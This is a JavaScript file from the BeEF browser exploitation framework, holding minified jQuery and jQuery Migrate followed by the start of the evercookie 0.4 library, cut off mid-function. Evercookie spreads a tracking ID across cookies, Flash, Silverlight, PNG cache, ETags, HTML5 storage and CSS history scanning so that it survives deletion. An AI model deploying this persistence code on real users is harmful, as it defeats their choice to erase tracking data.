C},getJSON:function(e,t,n){return x.get(e,t,n,"json")},getScript:function(e,n){return x.get(e,t,n,"script")}}),x.each(["get","post"],function(e,n){x[n]=function(e,r,i,o){return x.isFunction(r)&&(o=o||i,i=r,r=t),x.ajax({url:e,type:n,dataType:o,data:r,success:i})}});function Mn(e,n,r){var i,o,a,s,l=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),o===t&&(o=e.mimeType||n.getResponseHeader("Content-Type"));if(o)for(s in l)if(l[s]&&l[s].test(o)){u.unshift(s);break}if(u[0]in r)a=u[0];else{for(s in r){if(!u[0]||e.converters[s+" "+u[0]]){a=s;break}i||(i=s)}a=a||i}return a?(a!==u[0]&&u.unshift(a),r[a]):t}function On(e,t,n,r){var i,o,a,s,l,u={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)u[a.toLowerCase()]=e.converters[a];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!l&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),l=o,o=c.shift())if("*"===o)o=l;else if("*"!==l&&l!==o){if(a=u[l+" "+o]||u["* "+o],!a)for(i in u)if(s=i.split(" "),s[1]===o&&(a=u[l+" "+s[0]]||u["* "+s[0]])){a===!0?a=u[i]:u[i]!==!0&&(o=s[0],c.unshift(s[1]));break}if(a!==!0)if(a&&e["throws"])t=a(t);else try{t=a(t)}catch(p){return{state:"parsererror",error:a?p:"No conversion from "+l+" to "+o}}}return{state:"success",data:t}}x.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(e){return x.globalEval(e),e}}}),x.ajaxPrefilter("script",function(e){e.cache===t&&(e.cache=!1),e.crossDomain&&(e.type="GET",e.global=!1)}),x.ajaxTransport("script",function(e){if(e.crossDomain){var n,r=a.head||x("head")[0]||a.documentElement;return{send:function(t,i){n=a.createElement("script"),n.async=!0,e.scriptCharset&&(n.charset=e.scriptCharset),n.src=e.url,n.onload=n.onreadystatechange=function(e,t){(t||!n.readyState||/loaded|complete/.test(n.readyState))&&(n.onload=n.onreadystatechange=null,n.parentNode&&n.parentNode.removeChild(n),n=null,t||i(200,"success"))},r.insertBefore(n,r.firstChild)},abort:function(){n&&n.onload(t,!0)}}}});var Fn=[],Bn=/(=)\?(?=&|$)|\?\?/;x.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Fn.pop()||x.expando+"_"+vn++;return this[e]=!0,e}}),x.ajaxPrefilter("json jsonp",function(n,r,i){var o,a,s,l=n.jsonp!==!1&&(Bn.test(n.url)?"url":"string"==typeof n.data&&!(n.contentType||"").indexOf("application/x-www-form-urlencoded")&&Bn.test(n.data)&&"data");return l||"jsonp"===n.dataTypes[0]?(o=n.jsonpCallback=x.isFunction(n.jsonpCallback)?n.jsonpCallback():n.jsonpCallback,l?n[l]=n[l].replace(Bn,"$1"+o):n.jsonp!==!1&&(n.url+=(bn.test(n.url)?"&":"?")+n.jsonp+"="+o),n.converters["script json"]=function(){return s||x.error(o+" was not called"),s[0]},n.dataTypes[0]="json",a=e[o],e[o]=function(){s=arguments},i.always(function(){e[o]=a,n[o]&&(n.jsonpCallback=r.jsonpCallback,Fn.push(o)),s&&x.isFunction(a)&&a(s[0]),s=a=t}),"script"):t});var Pn,Rn,Wn=0,$n=e.ActiveXObject&&function(){var e;for(e in Pn)Pn[e](t,!0)};function In(){try{return new e.XMLHttpRequest}catch(t){}}function zn(){try{return new e.ActiveXObject("Microsoft.XMLHTTP")}catch(t){}}x.ajaxSettings.xhr=e.ActiveXObject?function(){return!this.isLocal&&In()||zn()}:In,Rn=x.ajaxSettings.xhr(),x.support.cors=!!Rn&&"withCredentials"in Rn,Rn=x.support.ajax=!!Rn,Rn&&x.ajaxTransport(function(n){if(!n.crossDomain||x.support.cors){var r;return{send:function(i,o){var a,s,l=n.xhr();if(n.username?l.open(n.type,n.url,n.async,n.username,n.password):l.open(n.type,n.url,n.async),n.xhrFields)for(s in n.xhrFields)l[s]=n.xhrFields[s];n.mimeType&&l.overrideMimeType&&l.overrideMimeType(n.mimeType),n.crossDomain||i["X-Requested-With"]||(i["X-Requested-With"]="XMLHttpRequest");try{for(s in i)l.setRequestHeader(s,i[s])}catch(u){}l.send(n.hasContent&&n.data||null),r=function(e,i){var s,u,c,p;try{if(r&&(i||4===l.readyState))if(r=t,a&&(l.onreadystatechange=x.noop,$n&&delete Pn[a]),i)4!==l.readyState&&l.abort();else{p={},s=l.status,u=l.getAllResponseHeaders(),"string"==typeof l.responseText&&(p.text=l.responseText);try{c=l.statusText}catch(f){c=""}s||!n.isLocal||n.crossDomain?1223===s&&(s=204):s=p.text?200:404}}catch(d){i||o(-1,d)}p&&o(s,c,p,u)},n.async?4===l.readyState?setTimeout(r):(a=++Wn,$n&&(Pn||(Pn={},x(e).unload($n)),Pn[a]=r),l.onreadystatechange=r):r()},abort:function(){r&&r(t,!0)}}}});var Xn,Un,Vn=/^(?:toggle|show|hide)$/,Yn=RegExp("^(?:([+-])=|)("+w+")([a-z%]*)$","i"),Jn=/queueHooks$/,Gn=[nr],Qn={"*":[function(e,t){var n=this.createTween(e,t),r=n.cur(),i=Yn.exec(t),o=i&&i[3]||(x.cssNumber[e]?"":"px"),a=(x.cssNumber[e]||"px"!==o&&+r)&&Yn.exec(x.css(n.elem,e)),s=1,l=20;if(a&&a[3]!==o){o=o||a[3],i=i||[],a=+r||1;do s=s||".5",a/=s,x.style(n.elem,e,a+o);while(s!==(s=n.cur()/r)&&1!==s&&--l)}return i&&(a=n.start=+a||+r||0,n.unit=o,n.end=i[1]?a+(i[1]+1)*i[2]:+i[2]),n}]};function Kn(){return setTimeout(function(){Xn=t}),Xn=x.now()}function Zn(e,t,n){var r,i=(Qn[t]||[]).concat(Qn["*"]),o=0,a=i.length;for(;a>o;o++)if(r=i[o].call(n,t,e))return r}function er(e,t,n){var r,i,o=0,a=Gn.length,s=x.Deferred().always(function(){delete l.elem}),l=function(){if(i)return!1;var t=Xn||Kn(),n=Math.max(0,u.startTime+u.duration-t),r=n/u.duration||0,o=1-r,a=0,l=u.tweens.length;for(;l>a;a++)u.tweens[a].run(o);return s.notifyWith(e,[u,o,n]),1>o&&l?n:(s.resolveWith(e,[u]),!1)},u=s.promise({elem:e,props:x.extend({},t),opts:x.extend(!0,{specialEasing:{}},n),originalProperties:t,originalOptions:n,startTime:Xn||Kn(),duration:n.duration,tweens:[],createTween:function(t,n){var r=x.Tween(e,u.opts,t,n,u.opts.specialEasing[t]||u.opts.easing);return u.tweens.push(r),r},stop:function(t){var n=0,r=t?u.tweens.length:0;if(i)return this;for(i=!0;r>n;n++)u.tweens[n].run(1);return t?s.resolveWith(e,[u,t]):s.rejectWith(e,[u,t]),this}}),c=u.props;for(tr(c,u.opts.specialEasing);a>o;o++)if(r=Gn[o].call(u,e,c,u.opts))return r;return x.map(c,Zn,u),x.isFunction(u.opts.start)&&u.opts.start.call(e,u),x.fx.timer(x.extend(l,{elem:e,anim:u,queue:u.opts.queue})),u.progress(u.opts.progress).done(u.opts.done,u.opts.complete).fail(u.opts.fail).always(u.opts.always)}function tr(e,t){var n,r,i,o,a;for(n in e)if(r=x.camelCase(n),i=t[r],o=e[n],x.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),a=x.cssHooks[r],a&&"expand"in a){o=a.expand(o),delete e[r];for(n in o)n in e||(e[n]=o[n],t[n]=i)}else t[r]=i}x.Animation=x.extend(er,{tweener:function(e,t){x.isFunction(e)?(t=e,e=["*"]):e=e.split(" ");var n,r=0,i=e.length;for(;i>r;r++)n=e[r],Qn[n]=Qn[n]||[],Qn[n].unshift(t)},prefilter:function(e,t){t?Gn.unshift(e):Gn.push(e)}});function nr(e,t,n){var r,i,o,a,s,l,u=this,c={},p=e.style,f=e.nodeType&&nn(e),d=x._data(e,"fxshow");n.queue||(s=x._queueHooks(e,"fx"),null==s.unqueued&&(s.unqueued=0,l=s.empty.fire,s.empty.fire=function(){s.unqueued||l()}),s.unqueued++,u.always(function(){u.always(function(){s.unqueued--,x.queue(e,"fx").length||s.empty.fire()})})),1===e.nodeType&&("height"in t||"width"in t)&&(n.overflow=[p.overflow,p.overflowX,p.overflowY],"inline"===x.css(e,"display")&&"none"===x.css(e,"float")&&(x.support.inlineBlockNeedsLayout&&"inline"!==ln(e.nodeName)?p.zoom=1:p.display="inline-block")),n.overflow&&(p.overflow="hidden",x.support.shrinkWrapBlocks||u.always(function(){p.overflow=n.overflow[0],p.overflowX=n.overflow[1],p.overflowY=n.overflow[2]}));for(r in t)if(i=t[r],Vn.exec(i)){if(delete t[r],o=o||"toggle"===i,i===(f?"hide":"show"))continue;c[r]=d&&d[r]||x.style(e,r)}if(!x.isEmptyObject(c)){d?"hidden"in d&&(f=d.hidden):d=x._data(e,"fxshow",{}),o&&(d.hidden=!f),f?x(e).show():u.done(function(){x(e).hide()}),u.done(function(){var t;x._removeData(e,"fxshow");for(t in c)x.style(e,t,c[t])});for(r in c)a=Zn(f?d[r]:0,r,u),r in d||(d[r]=a.start,f&&(a.end=a.start,a.start="width"===r||"height"===r?1:0))}}function rr(e,t,n,r,i){return new rr.prototype.init(e,t,n,r,i)}x.Tween=rr,rr.prototype={constructor:rr,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||"swing",this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(x.cssNumber[n]?"":"px")},cur:function(){var e=rr.propHooks[this.prop];return e&&e.get?e.get(this):rr.propHooks._default.get(this)},run:function(e){var t,n=rr.propHooks[this.prop];return this.pos=t=this.options.duration?x.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):rr.propHooks._default.set(this),this}},rr.prototype.init.prototype=rr.prototype,rr.propHooks={_default:{get:function(e){var t;return null==e.elem[e.prop]||e.elem.style&&null!=e.elem.style[e.prop]?(t=x.css(e.elem,e.prop,""),t&&"auto"!==t?t:0):e.elem[e.prop]},set:function(e){x.fx.step[e.prop]?x.fx.step[e.prop](e):e.elem.style&&(null!=e.elem.style[x.cssProps[e.prop]]||x.cssHooks[e.prop])?x.style(e.elem,e.prop,e.now+e.unit):e.elem[e.prop]=e.now}}},rr.propHooks.scrollTop=rr.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},x.each(["toggle","show","hide"],function(e,t){var n=x.fn[t];x.fn[t]=function(e,r,i){return null==e||"boolean"==typeof e?n.apply(this,arguments):this.animate(ir(t,!0),e,r,i)}}),x.fn.extend({fadeTo:function(e,t,n,r){return this.filter(nn).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(e,t,n,r){var i=x.isEmptyObject(e),o=x.speed(t,n,r),a=function(){var t=er(this,x.extend({},e),o);(i||x._data(this,"finish"))&&t.stop(!0)};return a.finish=a,i||o.queue===!1?this.each(a):this.queue(o.queue,a)},stop:function(e,n,r){var i=function(e){var t=e.stop;delete e.stop,t(r)};return"string"!=typeof e&&(r=n,n=e,e=t),n&&e!==!1&&this.queue(e||"fx",[]),this.each(function(){var t=!0,n=null!=e&&e+"queueHooks",o=x.timers,a=x._data(this);if(n)a[n]&&a[n].stop&&i(a[n]);else for(n in a)a[n]&&a[n].stop&&Jn.test(n)&&i(a[n]);for(n=o.length;n--;)o[n].elem!==this||null!=e&&o[n].queue!==e||(o[n].anim.stop(r),t=!1,o.splice(n,1));(t||!r)&&x.dequeue(this,e)})},finish:function(e){return e!==!1&&(e=e||"fx"),this.each(function(){var t,n=x._data(this),r=n[e+"queue"],i=n[e+"queueHooks"],o=x.timers,a=r?r.length:0;for(n.finish=!0,x.queue(this,e,[]),i&&i.stop&&i.stop.call(this,!0),t=o.length;t--;)o[t].elem===this&&o[t].queue===e&&(o[t].anim.stop(!0),o.splice(t,1));for(t=0;a>t;t++)r[t]&&r[t].finish&&r[t].finish.call(this);delete n.finish})}});function ir(e,t){var n,r={height:e},i=0;for(t=t?1:0;4>i;i+=2-t)n=Zt[i],r["margin"+n]=r["padding"+n]=e;return t&&(r.opacity=r.width=e),r}x.each({slideDown:ir("show"),slideUp:ir("hide"),slideToggle:ir("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){x.fn[e]=function(e,n,r){return this.animate(t,e,n,r)}}),x.speed=function(e,t,n){var r=e&&"object"==typeof e?x.extend({},e):{complete:n||!n&&t||x.isFunction(e)&&e,duration:e,easing:n&&t||t&&!x.isFunction(t)&&t};return r.duration=x.fx.off?0:"number"==typeof r.duration?r.duration:r.duration in x.fx.speeds?x.fx.speeds[r.duration]:x.fx.speeds._default,(null==r.queue||r.queue===!0)&&(r.queue="fx"),r.old=r.complete,r.complete=function(){x.isFunction(r.old)&&r.old.call(this),r.queue&&x.dequeue(this,r.queue)},r},x.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2}},x.timers=[],x.fx=rr.prototype.init,x.fx.tick=function(){var e,n=x.timers,r=0;for(Xn=x.now();n.length>r;r++)e=n[r],e()||n[r]!==e||n.splice(r--,1);n.length||x.fx.stop(),Xn=t},x.fx.timer=function(e){e()&&x.timers.push(e)&&x.fx.start()},x.fx.interval=13,x.fx.start=function(){Un||(Un=setInterval(x.fx.tick,x.fx.interval))},x.fx.stop=function(){clearInterval(Un),Un=null},x.fx.speeds={slow:600,fast:200,_default:400},x.fx.step={},x.expr&&x.expr.filters&&(x.expr.filters.animated=function(e){return x.grep(x.timers,function(t){return e===t.elem}).length}),x.fn.offset=function(e){if(arguments.length)return e===t?this:this.each(function(t){x.offset.setOffset(this,e,t)});var n,r,o={top:0,left:0},a=this[0],s=a&&a.ownerDocument;if(s)return n=s.documentElement,x.contains(n,a)?(typeof a.getBoundingClientRect!==i&&(o=a.getBoundingClientRect()),r=or(s),{top:o.top+(r.pageYOffset||n.scrollTop)-(n.clientTop||0),left:o.left+(r.pageXOffset||n.scrollLeft)-(n.clientLeft||0)}):o},x.offset={setOffset:function(e,t,n){var r=x.css(e,"position");"static"===r&&(e.style.position="relative");var i=x(e),o=i.offset(),a=x.css(e,"top"),s=x.css(e,"left"),l=("absolute"===r||"fixed"===r)&&x.inArray("auto",[a,s])>-1,u={},c={},p,f;l?(c=i.position(),p=c.top,f=c.left):(p=parseFloat(a)||0,f=parseFloat(s)||0),x.isFunction(t)&&(t=t.call(e,n,o)),null!=t.top&&(u.top=t.top-o.top+p),null!=t.left&&(u.left=t.left-o.left+f),"using"in t?t.using.call(e,u):i.css(u)}},x.fn.extend({position:function(){if(this[0]){var e,t,n={top:0,left:0},r=this[0];return"fixed"===x.css(r,"position")?t=r.getBoundingClientRect():(e=this.offsetParent(),t=this.offset(),x.nodeName(e[0],"html")||(n=e.offset()),n.top+=x.css(e[0],"borderTopWidth",!0),n.left+=x.css(e[0],"borderLeftWidth",!0)),{top:t.top-n.top-x.css(r,"marginTop",!0),left:t.left-n.left-x.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent||s;while(e&&!x.nodeName(e,"html")&&"static"===x.css(e,"position"))e=e.offsetParent;return e||s})}}),x.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(e,n){var r=/Y/.test(n);x.fn[e]=function(i){return x.access(this,function(e,i,o){var a=or(e);return o===t?a?n in a?a[n]:a.document.documentElement[i]:e[i]:(a?a.scrollTo(r?x(a).scrollLeft():o,r?o:x(a).scrollTop()):e[i]=o,t)},e,i,arguments.length,null)}});function or(e){return x.isWindow(e)?e:9===e.nodeType?e.defaultView||e.parentWindow:!1}x.each({Height:"height",Width:"width"},function(e,n){x.each({padding:"inner"+e,content:n,"":"outer"+e},function(r,i){x.fn[i]=function(i,o){var a=arguments.length&&(r||"boolean"!=typeof i),s=r||(i===!0||o===!0?"margin":"border");return x.access(this,function(n,r,i){var o;return x.isWindow(n)?n.document.documentElement["client"+e]:9===n.nodeType?(o=n.documentElement,Math.max(n.body["scroll"+e],o["scroll"+e],n.body["offset"+e],o["offset"+e],o["client"+e])):i===t?x.css(n,r,s):x.style(n,r,i,s)},n,a?i:t,a,null)}})}),x.fn.size=function(){return this.length},x.fn.andSelf=x.fn.addBack,"object"==typeof module&&module&&"object"==typeof module.exports?module.exports=x:(e.jQuery=e.$=x,"function"==typeof define&&define.amd&&define("jquery",[],function(){return x}))})(window);


/*! jQuery Migrate v1.2.1 | (c) 2005, 2013 jQuery Foundation, Inc. and other contributors | jquery.org/license */
jQuery.migrateMute===void 0&&(jQuery.migrateMute=!0),function(e,t,n){function r(n){var r=t.console;i[n]||(i[n]=!0,e.migrateWarnings.push(n),r&&r.warn&&!e.migrateMute&&(r.warn("JQMIGRATE: "+n),e.migrateTrace&&r.trace&&r.trace()))}function a(t,a,i,o){if(Object.defineProperty)try{return Object.defineProperty(t,a,{configurable:!0,enumerable:!0,get:function(){return r(o),i},set:function(e){r(o),i=e}}),n}catch(s){}e._definePropertyBroken=!0,t[a]=i}var i={};e.migrateWarnings=[],!e.migrateMute&&t.console&&t.console.log&&t.console.log("JQMIGRATE: Logging is active"),e.migrateTrace===n&&(e.migrateTrace=!0),e.migrateReset=function(){i={},e.migrateWarnings.length=0},"BackCompat"===document.compatMode&&r("jQuery is not compatible with Quirks Mode");var o=e("<input/>",{size:1}).attr("size")&&e.attrFn,s=e.attr,u=e.attrHooks.value&&e.attrHooks.value.get||function(){return null},c=e.attrHooks.value&&e.attrHooks.value.set||function(){return n},l=/^(?:input|button)$/i,d=/^[238]$/,p=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,f=/^(?:checked|selected)$/i;a(e,"attrFn",o||{},"jQuery.attrFn is deprecated"),e.attr=function(t,a,i,u){var c=a.toLowerCase(),g=t&&t.nodeType;return u&&(4>s.length&&r("jQuery.fn.attr( props, pass ) is deprecated"),t&&!d.test(g)&&(o?a in o:e.isFunction(e.fn[a])))?e(t)[a](i):("type"===a&&i!==n&&l.test(t.nodeName)&&t.parentNode&&r("Can't change the 'type' of an input or button in IE 6/7/8"),!e.attrHooks[c]&&p.test(c)&&(e.attrHooks[c]={get:function(t,r){var a,i=e.prop(t,r);return i===!0||"boolean"!=typeof i&&(a=t.getAttributeNode(r))&&a.nodeValue!==!1?r.toLowerCase():n},set:function(t,n,r){var a;return n===!1?e.removeAttr(t,r):(a=e.propFix[r]||r,a in t&&(t[a]=!0),t.setAttribute(r,r.toLowerCase())),r}},f.test(c)&&r("jQuery.fn.attr('"+c+"') may use property instead of attribute")),s.call(e,t,a,i))},e.attrHooks.value={get:function(e,t){var n=(e.nodeName||"").toLowerCase();return"button"===n?u.apply(this,arguments):("input"!==n&&"option"!==n&&r("jQuery.fn.attr('value') no longer gets properties"),t in e?e.value:null)},set:function(e,t){var a=(e.nodeName||"").toLowerCase();return"button"===a?c.apply(this,arguments):("input"!==a&&"option"!==a&&r("jQuery.fn.attr('value', val) no longer sets properties"),e.value=t,n)}};var g,h,v=e.fn.init,m=e.parseJSON,y=/^([^<]*)(<[\w\W]+>)([^>]*)$/;e.fn.init=function(t,n,a){var i;return t&&"string"==typeof t&&!e.isPlainObject(n)&&(i=y.exec(e.trim(t)))&&i[0]&&("<"!==t.charAt(0)&&r("$(html) HTML strings must start with '<' character"),i[3]&&r("$(html) HTML text after last tag is ignored"),"#"===i[0].charAt(0)&&(r("HTML string cannot start with a '#' character"),e.error("JQMIGRATE: Invalid selector string (XSS)")),n&&n.context&&(n=n.context),e.parseHTML)?v.call(this,e.parseHTML(i[2],n,!0),n,a):v.apply(this,arguments)},e.fn.init.prototype=e.fn,e.parseJSON=function(e){return e||null===e?m.apply(this,arguments):(r("jQuery.parseJSON requires a valid JSON string"),null)},e.uaMatch=function(e){e=e.toLowerCase();var t=/(chrome)[ \/]([\w.]+)/.exec(e)||/(webkit)[ \/]([\w.]+)/.exec(e)||/(opera)(?:.*version|)[ \/]([\w.]+)/.exec(e)||/(msie) ([\w.]+)/.exec(e)||0>e.indexOf("compatible")&&/(mozilla)(?:.*? rv:([\w.]+)|)/.exec(e)||[];return{browser:t[1]||"",version:t[2]||"0"}},e.browser||(g=e.uaMatch(navigator.userAgent),h={},g.browser&&(h[g.browser]=!0,h.version=g.version),h.chrome?h.webkit=!0:h.webkit&&(h.safari=!0),e.browser=h),a(e,"browser",e.browser,"jQuery.browser is deprecated"),e.sub=function(){function t(e,n){return new t.fn.init(e,n)}e.extend(!0,t,this),t.superclass=this,t.fn=t.prototype=this(),t.fn.constructor=t,t.sub=this.sub,t.fn.init=function(r,a){return a&&a instanceof e&&!(a instanceof t)&&(a=t(a)),e.fn.init.call(this,r,a,n)},t.fn.init.prototype=t.fn;var n=t(document);return r("jQuery.sub() is deprecated"),t},e.ajaxSetup({converters:{"text json":e.parseJSON}});var b=e.fn.data;e.fn.data=function(t){var a,i,o=this[0];return!o||"events"!==t||1!==arguments.length||(a=e.data(o,t),i=e._data(o,t),a!==n&&a!==i||i===n)?b.apply(this,arguments):(r("Use of jQuery.fn.data('events') is deprecated"),i)};var j=/\/(java|ecma)script/i,w=e.fn.andSelf||e.fn.addBack;e.fn.andSelf=function(){return r("jQuery.fn.andSelf() replaced by jQuery.fn.addBack()"),w.apply(this,arguments)},e.clean||(e.clean=function(t,a,i,o){a=a||document,a=!a.nodeType&&a[0]||a,a=a.ownerDocument||a,r("jQuery.clean() is deprecated");var s,u,c,l,d=[];if(e.merge(d,e.buildFragment(t,a).childNodes),i)for(c=function(e){return!e.type||j.test(e.type)?o?o.push(e.parentNode?e.parentNode.removeChild(e):e):i.appendChild(e):n},s=0;null!=(u=d[s]);s++)e.nodeName(u,"script")&&c(u)||(i.appendChild(u),u.getElementsByTagName!==n&&(l=e.grep(e.merge([],u.getElementsByTagName("script")),c),d.splice.apply(d,[s+1,0].concat(l)),s+=l.length));return d});var Q=e.event.add,x=e.event.remove,k=e.event.trigger,N=e.fn.toggle,T=e.fn.live,M=e.fn.die,S="ajaxStart|ajaxStop|ajaxSend|ajaxComplete|ajaxError|ajaxSuccess",C=RegExp("\\b(?:"+S+")\\b"),H=/(?:^|\s)hover(\.\S+|)\b/,A=function(t){return"string"!=typeof t||e.event.special.hover?t:(H.test(t)&&r("'hover' pseudo-event is deprecated, use 'mouseenter mouseleave'"),t&&t.replace(H,"mouseenter$1 mouseleave$1"))};e.event.props&&"attrChange"!==e.event.props[0]&&e.event.props.unshift("attrChange","attrName","relatedNode","srcElement"),e.event.dispatch&&a(e.event,"handle",e.event.dispatch,"jQuery.event.handle is undocumented and deprecated"),e.event.add=function(e,t,n,a,i){e!==document&&C.test(t)&&r("AJAX events should be attached to document: "+t),Q.call(this,e,A(t||""),n,a,i)},e.event.remove=function(e,t,n,r,a){x.call(this,e,A(t)||"",n,r,a)},e.fn.error=function(){var e=Array.prototype.slice.call(arguments,0);return r("jQuery.fn.error() is deprecated"),e.splice(0,0,"error"),arguments.length?this.bind.apply(this,e):(this.triggerHandler.apply(this,e),this)},e.fn.toggle=function(t,n){if(!e.isFunction(t)||!e.isFunction(n))return N.apply(this,arguments);r("jQuery.fn.toggle(handler, handler...) is deprecated");var a=arguments,i=t.guid||e.guid++,o=0,s=function(n){var r=(e._data(this,"lastToggle"+t.guid)||0)%o;return e._data(this,"lastToggle"+t.guid,r+1),n.preventDefault(),a[r].apply(this,arguments)||!1};for(s.guid=i;a.length>o;)a[o++].guid=i;return this.click(s)},e.fn.live=function(t,n,a){return r("jQuery.fn.live() is deprecated"),T?T.apply(this,arguments):(e(this.context).on(t,this.selector,n,a),this)},e.fn.die=function(t,n){return r("jQuery.fn.die() is deprecated"),M?M.apply(this,arguments):(e(this.context).off(t,this.selector||"**",n),this)},e.event.trigger=function(e,t,n,a){return n||C.test(e)||r("Global events are undocumented and deprecated"),k.call(this,e,t,n||document,a)},e.each(S.split("|"),function(t,n){e.event.special[n]={setup:function(){var t=this;return t!==document&&(e.event.add(document,n+"."+e.guid,function(){e.event.trigger(n,null,t,!0)}),e._data(this,n,e.guid++)),!1},teardown:function(){return this!==document&&e.event.remove(document,n+"."+e._data(this,n)),!1}}})}(jQuery,window);


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
 * evercookie 0.4 (10/13/2010) -- extremely persistent cookies
 *
 *  by samy kamkar : code@samy.pl : http://samy.pl
 *
 * this api attempts to produce several types of persistent data
 * to essentially make a cookie virtually irrevocable from a system
 *
 * specifically it uses:
 *  - standard http cookies
 *  - flash cookies (local shared objects)
 *  - silverlight isolated storage
 *  - png generation w/forced cache and html5 canvas pixel reading
 *  - http etags
 *  - http cache
 *  - window.name
 *  - IE userData
 *  - html5 session cookies
 *  - html5 local storage
 *  - html5 global storage
 *  - html5 database storage via sqlite
 *  - css history scanning
 *
 *  if any cookie is found, it's then reset to all the other locations
 *  for example, if someone deletes all but one type of cookie, once
 *  that cookie is re-discovered, all of the other cookie types get reset
 *
 *  !!! SOME OF THESE ARE CROSS-DOMAIN COOKIES, THIS MEANS
 *  OTHER SITES WILL BE ABLE TO READ SOME OF THESE COOKIES !!!
 *
 * USAGE:

	var ec = new evercookie();	
	
	// set a cookie "id" to "12345"
	// usage: ec.set(key, value)
	ec.set("id", "12345");
	
	// retrieve a cookie called "id" (simply)
	ec.get("id", function(value) { alert("Cookie value is " + value) });

	// or use a more advanced callback function for getting our cookie
    // the cookie value is the first param
    // an object containing the different storage methods
	// and returned cookie values is the second parameter
    function getCookie(best_candidate, all_candidates)
    {
        alert("The retrieved cookie is: " + best_candidate + "\n" +
        	"You can see what each storage mechanism returned " +
			"by looping through the all_candidates object.");

		for (var item in all_candidates)
			document.write("Storage mechanism " + item +
				" returned " + all_candidates[item] + " votes<br>");
    }
    ec.get("id", getCookie);

	// we look for "candidates" based off the number of "cookies" that
	// come back matching since it's possible for mismatching cookies.
	// the best candidate is very-very-likely the correct one
	
*/

/* to turn off CSS history knocking, set _ec_history to 0 */
var _ec_history = 1; // CSS history knocking or not .. can be network intensive
var _ec_tests = 10;//1000;
var _ec_debug = 0;

function _ec_dump(arr, level)
{
	var dumped_text = "";
	if(!level) level = 0;
	
	//The padding given at the beginning of the line.
	var level_padding = "";
	for(var j=0;j<level+1;j++) level_padding += "    ";
	
	if(typeof(arr) == 'object') { //Array/Hashes/Objects 
		for(var item in arr) {
			var value = arr[item];
			
			if(typeof(value) == 'object') { //If it is an array,
				dumped_text += level_padding + "'" + item + "' ...\n";
				dumped_text += _ec_dump(value,level+1);
			} else {
				dumped_text += level_padding + "'" + item + "' => \"" + value + "\"\n";
			}
		}
	} else { //Stings/Chars/Numbers etc.
		dumped_text = "===>"+arr+"<===("+typeof(arr)+")";
	}
	return dumped_text;
}

function _ec_replace(str, key, value)
{
	if (str.indexOf('&' + key + '=') > -1 || str.indexOf(key + '=') == 0)
	{
		// find start
		var idx = str.indexOf('&' + key + '=');
		if (idx == -1)
			idx = str.indexOf(key + '=');

		// find end
		var end = str.indexOf('&', idx + 1);
		var newstr;
		if (end != -1)
			newstr = str.substr(0, idx) + str.substr(end + (idx ? 0 : 1)) + '&' + key + '=' + value;
		else
			newstr = str.substr(0, idx) + '&' + key + '=' + value;

		return newstr;
	}
	else
		return str + '&' + key + '=' + value;
}


// necessary for flash to communicate with js...
// please implement a better way
var _global_lso;
function _evercookie_flash_var(cookie)
{
	_global_lso = cookie;

	// remove the flash object now
	var swf = $('#myswf');
	if (swf && swf.parentNode)
		swf.parentNode.removeChild(swf);
}

var evercookie = (function () {
this._class = function() {

var self = this;
// private property
_baseKeyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
this._ec = {};
var no_color = -1;

this.get = function(name, cb, dont_reset)
{
	$(document).ready(function() {
		self._evercookie(name, cb, undefined, undefined, dont_reset);
	});
};

this.set = function(name, value)
{
	$(document).ready(function() {
			self._evercookie(name, function() { }, value);
	});
};

this._evercookie = function(name, cb, value, i, dont_reset)
{
	if (typeof self._evercookie == 'undefined')
		self = this;
	
	if (typeof i == 'undefined')
		i = 0;

	// first run
	if (i == 0)
	{
		self.evercookie_database_storage(name, value);
		self.evercookie_png(name, value);
		self.evercookie_etag(name, value);
		self.evercookie_cache(name, value);
		self.evercookie_lso(name, value);
		self.evercookie_silverlight(name, value);

		self._ec.userData		= self.evercookie_userdata(name, value);
		self._ec.cookieData		= self.evercookie_cookie(name, value);
		self._ec.localData		= self.evercookie_local_storage(name, value);
		self._ec.globalData		= self.evercookie_global_storage(name, value);
		self._ec.sessionData	= self.evercookie_session_storage(name, value);
		self._ec.windowData		= self.evercookie_window(name, value);
	
		if (_ec_history)
			self._ec.historyData = self.evercookie_history(name, value);
	}

	// when writing data, we need to make sure lso and silverlight object is there
	if (typeof value != 'undefined')
	{
		if (
            (
                (typeof _global_lso == 'undefined') ||
                (typeof _global_isolated == 'undefined')
            )
            && i++ < _ec_tests
        )
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
	}
	
	// when reading data, we need to wait for swf, db, silverlight and png
	else
	{
		if (
			(
				// we support local db and haven't read data in yet
				(window.openDatabase && typeof self._ec.dbData == 'undefined') ||
				(typeof _global_lso == 'undefined') ||
				(typeof self._ec.etagData == 'undefined') ||
				(typeof self._ec.cacheData == 'undefined') ||
				(document.createElement('canvas').getContext && (typeof self._ec.pngData == 'undefined' || self._ec.pngData == '')) ||
